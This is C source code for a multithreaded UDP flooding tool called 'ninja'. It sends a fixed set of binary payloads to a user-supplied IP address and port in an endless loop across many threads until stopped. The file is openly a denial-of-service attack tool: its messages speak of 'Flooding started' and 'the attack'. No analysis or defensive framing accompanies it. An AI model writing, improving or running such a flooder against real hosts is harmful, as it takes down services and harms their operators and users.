#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

void usage() {
    printf("Usage: ./ninja <IP> <PORT> <1/2 (start/stop)> <THREADS>\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int running;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    char *payloads[] = {
        "\xd9\x00",
        "\x00\x00",
        "\xF9\x05\x1D",
         "\x49\x05\x36\x80\x3F\xDE\x2A\x32\xCC\xAC\x7B\x53\xF3\x30\x86\x4E\x0F\x5D\xF5\xB5\x1A\x2B\x9D\x59\x88\xF7\xAB\xD1\x21\x9C\xE2\x88\x38\x52\x90\x1F\x9D\x2B\xB0\x93\x17\x74\xD0\x40\x21\x7D\x6C\x45\xFF\xA5\x3A\x15\x79\x4B\xFB\xE8\x57\xE7\x50\x34\x7D\xB6\xC1\x9B\x00\xA0\xDE\x5C\xD1\x34\x0E\xBB\xFC\x68\xDE\x56\x4B\x55\xD4\xD1\xF5\xA2\x88\xE5\xF8\x24\x2F\x0D\x04\x65\xFB\x7A\xE4\xEB\xB5\xE4\x5C\x28\x57\xB8\xC8\xF6\xE1\xC7\x38\xAD\x6B\xF2\xEE\x89\x22\x8D\x5F\xF6\xBD\x67\xD9\x5D\x00\x5E\xF7\x6F\x23\x48\x2A\x6B\xF6\x46\x18\x1F\xFB\xAE\x45\xE8\xFF\xF2\xD4\x57\x38\xE1\xE0\x83\x8C\xCA\xDC\xEB\x6C\xFB\xF6\x5B\x44\x75\x6F\x37\x9A\xED\x59\xC2\x50\xC2\xA7\xBF\x7D\x4C\x7C\x0E\x77\xD7\x54\x3C\x63\xA3\x64\x1C\x13\x07\xB9\xC0\x26\x00\x79\x38\x7F\xFC\xFD\x63\x14\xAB\x45\x48\x1F\xE3\x51\x7B\x1F\xB6\xF1\x0E\x9D\xA6\xD5\xD4\x5D\xE2\x6B\x1D\x57\xD4\x72\xB3\x3F\xC0\x80\xF6\xAE\x06\xFD\xAE\x8D\x42\x92\xB7\xFD\x7A\xBC\xC2\x95\x80\xD4\x24\x4C\x23\x68\xE2\x6C\xAB\xC5\x5A\x23\x5B\x21\x90\x76\xDE\x51\x54\xC9\x35\x1F\x4A\x76\x51\x31\x4E\xF3\xBB\xA5\xDC\x93\x41\x69\x37\x10\x6C\xFA\x58\xC3\xF9\x39\x77\xB7\xF0\x69\x0C\x5A\x8E\x31\xFE\x49\xC8\x63\x85\x41\x0B\xF7\xF6\x43\x30\xA9\x7F\x0F\xE6\xFF\xD6\x0C\x75\x3F\xCF\xA7\x61\xEA\x75\x70\xB6\xE0\x1D\x85\x6D\x81\x4F\x8D\xA1\x92\x27\xEC\x79\xDA\xAB\xD8\x92\xE0\x99\xE3\x9C\x2C\x4D\xD7\x7F\xAD\x8F\x10\x5B\x92\xF6\x5D\x84\x07\xD9\xB6\x9F\x84\x2E\xBC\xBF\x49\x86\xF8\xE7\xA3\xC3\x67\x8C\x8E\x96\xC6\xFA\xD0\xFA\xA5\x3C\xCC\xE7\x95\x47\x48\x47\xB9\xDF\xA8\xCD\xE2\xA1\x26\x8E\x7E\x8C\x40\xC6\x36\xE2\xD5\x87\x83\xEE\x11\xDB\xE4\xF1\x25\x52\xE7\xFC\xC0\xC6\x36\x89\x4F\xF6\xD0\x1C\x35\xA5\x3E\x92\x83\xC1\xD5\x19\x9E\x46\x4A\xD0\xF8\xC6\x1E\x1B\x97\xBB\xA5\x5A\x43\x84\xD1\xF0\x94\xD4\x58\x4F\x36\x07\x89\x6E\xF4\x68\xBD\x9A\xE7\x4D\x63\x28\x30\x55\xDD\xA3\xBB\x23\x4D\x87\xD1\xC4\x17\xF2\xA7\x50\x11\x71\xA0\x47\xF5\xA6\x1E\x0E\x1D\xD3\x2B\x0D\x68\x59\xAB\xB2\x0C\x83\xCB\x28\x0D\x74\x96\xF5\x19\x82\x69\x88\x43\xE7\x72\x48\xEA\xA6\x26\xF1\xC8\xEE\x25\xDF\x18\x64\xC0\x2F\x42\x80\xE1",
    "\x4D\x05\x36\x80\x13\xDE\x6A\xE6\xD6\xAC\x63\x6B\x5B\x60\x62\x6C\x17\xA1\xB2\xC4\xE3\x13\xCA\xD1\x55\xC5\x50\x8D\x17\xBC\x63\x5E\x75\xD6\xA0\x15\x6A\x00\xE9\x82\x61\xF8\xD9\x43\x83\x36\x38\x66\x47\x5E\x11\x6F\x3B\x48\x20\xB2\x7C\x14\xFF\x4F\x6C\x34\x3D\x81\x7A\x4B\xAC\x30\xB8\xA0\x74\x27\xAF\xDF\xD5\xEC\xC2\x5E\x27\xB5\x5B\xF8\x73\x9C\xA3\xFE\x16\x63\x5B\x82\x14\x6E\xC9\x8F\x01\x19\x14\x6A\xB3\xFB\x37\x09\x0E\x3A\xC6\x37\x1C\xD9\x81\x72\xB3\x4A\x39\xED\x70\xAC\x4E\x8E\x96\x05\x82\xD4\x15\x23\x8D\x05\xED\xDC\x11\x23\x86\x46\x6C\xD8\x9A\xCE\x8A\xE9\x4E\x1F\xC4\xD7\x94",
    "\x59\x05\x36\x80\xC7\xE1\xFE\xEC\x55\x5C\x63\xFB\x2F\xCA\x72\xE8\x35\x39\xA4\x1E\x83\xEB\xF1\x5B\x34\xA4\x8F\xF4\x6D\x7F\x58\x76\xC6\xAA\xDA\xCD\xBC\x2B\x92\x93\x43\x92\x0E\xC3\x61\x5E\xC8\xC6\xF4\x25\xC0\xB5\x14\xC1\x5A\xC1\x59\x73\x4C\x44\xED\x90\x1A\x9F\x00\x20\xC7\x58\x07\x1C\x16\x13\x56\xCC\x76",
    "\x0D\x07\x8E\x83\xC7\x45\x9C\xCB\x56\xA1\x03",
    "\x35\x04\x38\x90\x97\x3D\x70\x63\x71\xAC\x63\x6B\x6B\xED\x32\xE3\x17\x89\xB8\xC4\xE3\x8B\x16\xF3\x92\x43\xC7\x41\x84\x12\xF4\x72\xEE\x21\x3E\xF2\x1C\x85\x3E\x5F\x8E\xB5\xB7\x48\xBC\xD3\x47\x8F\xF2\xE8\x85\x7B\xBE\xAE\xB3\x8C\xF9\x8B\x19\x3C\x97\xBD\x4D\xB6\x2C\x8F\x8B\x25\xC3\x0E\x5A\x02\x08\x78\xE8\x03\xBE\x5E\x7D\xA2\xE5\x6E\x0D\x59\x14\x48\xF0\xE6\x20\xF1\x3F\x1D\x4A\x89\x01\x19\x94\xC2\x5F\xD6\x9B\x87\x93\x56\xD7\x66\x6E\x58\xE1\x83\xED\xE5\xF4\xAA\xD5\x8F\xF0\x61\x2A\x62\x7D\xE1\x6A\xB6\x15\x47\x7A\x2B\x97\x4D\x53\x99\x8B\x26\xDF\x5E\x98\x8B\x0E\xFD\x5C\x44\x78\xCA\xBB\x38\x19\xEF\x01\x1B\xF2\x75\xAF\xBD\x02\x9F\xEC\x25\x7A\x68\x08\x53\xDA\xA5\xF9\xE2\x72\xDE\xD8\x91\x0E\xDE\xEB\xF4\x56\x8A\x5F\x64\x3E\xE9\xBD\xD2\x7E\x5A\xB3\x8B\xF8\xE0\x7D\xC4\x92\x8D\x3C\xD7\x5B\x1E\x77\x01\xA6\xC8\xB9\xBF\xC4\x16\xCA\x70\xD9\xA5\x46\x82\xB1\x4B\xF0\x78\x70\xE9\xA4\x96\xE6\x4B\x16\x71\x5E\x19\x51\xDD\x13\x1B\xE4\x3F\xE0\x2E\xE5\x7F\xEE\x24\x48\x1E\x49\x07\xA7\x10\x32\x08\xE9\x58\x88\x17\x44\xB6\x41\x3E\xCB\xC7\x59\xC5\x0C\x80\xD3\x69\x07\xD0\x36\x93\x89\x7F\xEA\x65\x84\x09\x14\x1B\xC5\x00\x17\x4A\xC2\x10\xEC\x4A\xE1\x7B\xA8\x91\xBB\x59\x08\x4D\x76\xC8\x91\xCA\xB5\xFC\x0D\xD4\xD7\x55\x3D\x23\xF5\x64\x20\xFE\x8A\x70\xCF\x4F\x51\xF5\x3B\x97\x26\xEF\xE1\xB6\x53\x7C\xDB\x91\x8E\x16\x68\x32\x27\x83\x42\xC9\xE7\x63\x5A\x5C\x36\xAB\x2A\x3C\x7B\xE1\xA6\x87\xEC\xE4\x02\xE3\x91\x1B\x82\xCF\x8F\x8C\x0A\xE7\xA5\x65\xCA\xC8\x71\x32\x26\x30\xEA\x43\x8C\xA9\x89\x98\x44\xAE\x98\x50\x82\xA3\xC2\x72\x41\x4F\x68\xAF\x78\x46\x02\x52\x1A\x3B\x67\x5D\x7E\x59\x38\x52\x42\xD8\x26\xD3\xDB\xA5\xE3\xF8\x94\x21\xE7\xAB\xD4\x4A\x60\xF0\x09\xFC\x54\x06\x0D\xD2\xEE\x5E\x08\x5D\x79\xC3\x9A\x26\x9D\x18\x3F\x58\x7C\xD9\x3D\x14\x69\x6B\x84\x6D\xB0\xB6\xEA\x1E\x81\x97\xC5\x0D\x81\xB4\xAD\xB0\xFB\x80\x4B\xBE\x9E\x64\x3A\x1F\xA6\xFE\x41\xA6\x43\x1A\xF8\x53\xDB\xD7\x30\xEF\xEE\x68\x38\x0F\x5E\xF2\xE7\x88\xEA\x0C",
    "\x95\xF5\x04\xB0\xC7\x81\x32\xEA\x1F\xAF\xE1\x6B\xA2\x4B",
    "\x95\xF5\x04\xB0\xC3\x81\xCD\x23\x48\x1D\xD9\x94\xB1\xED\x49\x47\xE7\x98\xCF\x77\x6C\x39\xDF\xDB\x6C\x59",
    "\x95\xF5\x04\xB0\xE7\x81\x17\x20\xC8\xC9\xEF\x19\xED\x11\xD1\xF9\x46\x4B\xB0\xC4\xF1\x3B\xEF\xF3\x8C\xFA\x6B\xC3\xA7\xB3\x1D\x85\x4A\x9B\x3C\x36\xE7\xE3\xC3\x9D",
    "\x95\xF5\x04\xB0\xEB\x81\x51\x20\xE9\x49\xF8\x59\xE5\x71\xD5\xE9\x44\x37\x99\x37\x77\x10\x39\xE5\xDB\x71\x19\xB4\x54\x37\x34\x23\xD9\x87\xA0\x8A\x7A\xE1\xD4\x76\xA0\x61\xA0\xF9\xB8\xD1\x1F\x9B\xF6\x16\x9D\x8E\x9A\x85\xBE\x66\x65\x33\x65\x9E\x39\xB7\xC7\xBD\xA0\x2D\x97\x8F\xE7\xE3",
    "\x95\xF5\x04\xB0\x83\x81\x0A\xEA\x7F\xB5\xEB\xAE\x13\x5A\x12\xC9\x57\xC8\xBA\xA9\xE8\xBF\x43\xB7\x80\xE2\xC3\x60\xEC\x83\x19\x76\x9F\xDD\x19\x5E\x47\x59\xC9\x4A\xAE\xAF\xA4\x46\x3A\xBA\xDE\x20\x16\x56\x2D\x19\x50\x4B\x56\xBA\x5B\xF1\x72\x2C\x71\xBE\xC7\x87\xAB\xE3\xD3\x4B\xCA\x08\x74\xB6\x59\xFD\x2E\xED\x43\x1D\x75\x0A\x17\x5E\x52\xCB\x9E\xCC\x29\x41\xB1\x77\x73\x06\x28\xAD\xE5\x88\xFF\x3C\x75\xCB\x70\xF7\x34\xB9\x71\x59\x64\xCB\xEA\x15\xC0\x19\x5A\x1C\xBB\xD2\x43\x0F\x30\x04\xF1\x2F\x27\x11\x9C\x6F\xF4\x2D\xC7\x37\xED\x39\x11\x53\x18\x27\xDF\xEB\x0E\xAB\xDF\x91\xB0\xB2\x4E\x38\xEF\x0B\xF6\x59\xFC\x77\xE3",
    "\x95\xF5\x04\xB0\xDF\x81\x12\xEA\x9F\xA8\xD7\xE1\x0D\x60\x4A\xFC\x50\x01\xB8\xC4\xE3\x8B\x16\xF3\x92\x43\xC7\x41\x84\x12\xF4\x72\xEE\x21\x3E\xF2\x1C\x85\x3E\x5F\x8E\xB5\x57\xE9\x1D\x13\xA5\xC0\x76\x6F\xE0\xFD\x1B\xE3\xD7\x4C\x79\x0A\xB0\x71\x55\x3A\x4A\xB5\x6D\xCC\x6C\x62\x47\x4D\x1A\xC1\x2F\x1C\x0B\x81\xDD\x78\x98\xA3\x84\x88\xC9\x7B\x35\x69\x90\x4E\x8C\x3D\xB2\x1B\x6A\x8C\x01\x19\xB4\x8D\x85\xA3\x5C\x24\x54\xB8\x3C\x2D\x62\x0B\x7B\xC0\x7D\x6C\xCA\x9B\xBE\x16\x14\xB8\xBD\xB3\x2C\x9F\xE6\x58\x9A\x6E\xF6\xA6\x72\x82\x6E\x1E\x34\xD0\x3A\x74\x31\x81\xC4\x33\x59\x22\x0D\x8B\xDE\xFA\xEC\xAF\x8F\x59\x2F\x06\xD4\xD5\x00\xB6\x96\xC2\xCB\xB5\x34\xBE\xCE\x4E\xF6\xBF\xCE\x46\x25\xBD\x2A\x32\x04\x61\xD0\xA5\xBB\x7B\x0E\xF6\x40\xFD\x4A\x3B\xF0\xE0\xA1\xCA\x54\x01\x9D\x3A\x58\x98\x97\xA7\x6A\x0D\x11\x0C\x34\x55\x04\xEB\xAE\xDD\xEC\xFA\x8A\x1B\xAC\x0F\x97\x14\xDD\x23\xE7\x79\x60\xF4\x13\x1E\x2C\x6F\xFE\xAB\x64\x89\x84\xB2\x75\xC3\x08\xD1\xCA\x49\xC4\x30\x49\x07\xA7\xA0\xB9\xB8\x92\x5B\xF8\x3F\xC8\x3B\x27\xC1\xBE\xAD\xB1\x88\xA1\xEC\x5F\x87\x14\x3F\x10\x9C\xE7\xE5\xC2\x79\x09\xE4\xF9\x15\xF8\x0D\x23\xD5\x53\xA9\x5D\xE3\x50\xD0\x21\x20\x32\x62\xED\x92\x59\xAD\x4E\xEA\x51\x3A\x17\x5A\xD1\xEF\x54\xA4\x87",
    "\x95\xF5\x04\xB0\x87\x81\xF1\x20\xB9\x49\xD0\x59\xF1\x71\xDF\xE9\x41\xB7\x9B\x77\x76\xB0\x39\xB5\xDB\x59\x19\xB8\x54\x31\x34\x20\x25\xAD\x33\x12\x21\x34\xB3\xC3\x53\x11\xF2\xC1\x11\x7D\x7B\x90\xEA\x73\x2F\x82\x67\x3F\x8D\xC7\xA0\x81\x0A\xD2\x3B\xB1\x27\x78\xAE\x8A\x7B\xAA\x9B\xD0\x1A\x29\x64\xF4\x46\x2F\x50\x43\x54\x2E\x68\xE1\x80\x97\xDC\xE6\x1F\x84\x4A\x83\x4F\x1D\x4E\x8C\x01\x19\x7C\x0E\xE3\x94\x51\x6D\x70\xD4\x56\x41\x0C\xD0\x86\x6B\xA4\xA3\x37\xE6\x5F\x86\xDF\x27\x04\x0E\xF1\x93\xCC\x80\xC6\x6E\xEA\x12\x7E\x81\xD1\x16\xF9\x26\xD1\xCA\x6F\x14\x01\x32\x50\x82\x04\x8A\x1E\x64\x64\xAF\x35\xDB\x98\x75\x61\xB7\xC8\x9F\xA8\xC0\xD0\x62\xA5\xBF\x11\xAF\x47\x75\x23\xF7\x58\x1C\xE3\x33\x23\x38\xFA\x69\xD3\xC1\x17\xE5\xD3\x3C\x1B\xF0\xB9\xE5\x30\xFB\x05\x0A\x1F\xA2\x51\x3B\x2E\x63\xCD\xDA\xAF\x32\x62\xA0\x5B\x5C\x90\xFA\x03\xAD\x45\xAD\xDD\x25\x70\xBF\x60\x46\x1D\xFD\x4F\x3E\x9A\x9F\x55\x2A\xA9\x6C\x1D\xDA\x0F\x69\x89\x1D\xD6\x0B\x42\xFE\xC5\x18\x49\xDB\x79\xAE\x2A\xCF\x0F\xBC\x16\xE1\x12\x3B\x6F\x53\x27\xEC\x11\x89\xBD\x4C\x4F\x57\x09\xEB\x71\x14\x6D\x74\x93\xA9\x40\x45\xEA\xD0\xFF\xCE\x63\x0A\xD3\xA3\xEC\xC0\x79\x7C\xB8\xA0\x0D\x2A\xB2\xF4\x99\xE8\x9D\x00\xCD\x08\xCF\xCC\x9B\xCD\x3E\x07\xE3\xB4\xC6\xCF\x4F\x71\x15\x73\x97\x07\xD2\xD5\x0E\x0F\xEC\xF0\x7E\x80\x0B\x1B\xE1\xB6\xE4\x8C\xEC\x4F\xA5\x4C\xB5\xA9\xAE\x76\x8A\xFC\xE7\x5B\xDC\xE3\xA6\x87\x8C\x6E\x2C\x6F\xFF\x03\xE5\xAE\xE2\x82\x67\x0F\x08\x68\x24\x05\xDC\xFE\xAB\x3E\x64\xA7\x91\x23\xF7\x80\xB8\xC7\xE5\x0D\x63\x35\xC1\xF0\x99\x8A\xC9\x21\x21\xCE\x44\xC3\xF6\x31\x7E\xD2\x52\x2D\x50\xB2\x8D\xC2\xE8\x96\x2B\xE9\x4E\x80\x95\x56\x06\xE4\xF6\xF6\x96\xF0\x5C\x60\x54\x24\x7B\xD3\x4C\x0E\x83\x1B\xB5\x3D\x97\x08\x50\x60\x10\xBF\x70\x8D\xF6\x7B\x74\x9C\x0C\x63\xD8\x66\x6F\xBA\xA2\x5D\x34\x45\xF8\x75\x47\xBA\xCF\xD8\x2B\xAF\xB7\x30\x02\x5B\xE3\x3E\x0C\xC2\x81\x33\xB4\xBF\x16\x67\x39\x39\xD3\x40\xBA\x03\x40\x49\xEC\xB4\xCB\xD0\xDF\x7B\x5F\x51\xCB\x82\x44",
         
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    while (data->running) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int action = atoi(argv[3]); // 1 for start, 2 for stop
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, 0}; // Set running to 0 (false)

    if (action == 1) {
        data.running = 1; // Set running to 1 (true)
        printf("Flooding started on %s:%d with %d threads\n", ip, port, threads);

        for (int i = 0; i < threads; i++) {
            if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
                perror("Thread creation failed");
                free(thread_ids);
                exit(1);
            }
            printf("Launched thread with ID: %lu\n", thread_ids[i]);
        }

        // Wait for user input to stop the attack
        printf("Press Enter to stop the attack...\n");
        getchar(); // Wait for the user to press Enter

        data.running = 0; // Set running to 0 (false)

        for (int i = 0; i < threads; i++) {
            pthread_join(thread_ids[i], NULL);
        }

        printf("Attack stopped\n");
    } else if (action == 2) {
        data.running = 0; // Ensure running is false
        printf("No attack in progress. Stopping...\n");
    } else {
        usage();
    }

    free(thread_ids);
    return 0;
}
